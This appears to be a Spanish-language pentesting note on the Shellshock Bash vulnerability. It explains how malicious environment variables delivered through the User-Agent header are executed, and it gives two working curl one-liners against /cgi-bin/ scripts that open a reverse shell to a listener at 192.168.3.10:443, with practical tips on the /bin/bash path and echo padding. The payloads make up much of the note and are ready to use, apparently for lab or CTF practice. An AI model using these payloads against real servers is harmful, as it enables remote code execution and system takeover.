--------------
- Tags: #owasp
--------------

# Definicion

Un ataque **Shellshock** es un tipo de ataque informático que aprovecha una vulnerabilidad en el **intérprete de comandos Bash** en sistemas operativos basados en Unix y Linux. Esta vulnerabilidad se descubrió en 2014 y se considera uno de los ataques más grandes y generalizados en la historia de la informática.

Esta vulnerabilidad en Bash permite a los atacantes ejecutar comandos maliciosos en el sistema afectado, lo que les permite tomar el control del sistema y acceder a información confidencial, modificar archivos, instalar programas maliciosos, etc.

La vulnerabilidad Shellshock se produce en el intérprete de comandos Bash, que es utilizado por muchos sistemas operativos Unix y Linux para ejecutar scripts de shell. El problema radica en la forma en que Bash maneja las variables de entorno. Los atacantes pueden inyectar código malicioso en estas variables de entorno, las cuales Bash ejecuta sin cuestionar su origen o contenido.

Los atacantes pueden explotar esta vulnerabilidad a través de diferentes vectores de ataque. Uno de ellos es a través del **User-Agent**, que es la información que el navegador web envía al servidor web para identificar el tipo de navegador y sistema operativo que se está utilizando. Los atacantes pueden manipular el User-Agent para incluir comandos maliciosos, que el servidor web ejecutará al recibir la solicitud.

### Normalmente si encontramos un /cgi-bin/ (*WFuzz, Gobuster, etc*), puede ser factible testear un ShellShock

------------------

- *OneLiner ReverseShell *
```Bash
curl -s http://127.0.0.1/cgi-bin/status --proxy http://192.168.3.110:3128 -H "User-Agent: () { :; }; echo; /bin/bash -c '/bin/bash -i >& /dev/tcp/192.168.3.10/443 0>&1'"
```

### - Tener en cuenta que se trata de usar la ruta de bash desde */bin/bash* para evitar problemas debido a la antiguedad de la bash
#### - La parte donde ponemos un *echo*, es necesaria para evitar errores, en otras ocasiones incluso tendremos que ponerlo no 1, sino 2 o 3 veces

- ## Opcion 2
```bash
 curl -s -X GET "http://192.168.3.113/cgi-bin/test.sh" -H "User-Agent: () { :; }; echo; /bin/bash -c '/bin/bash -i >& /dev/tcp/192.168.3.10/443 0>&1'"
```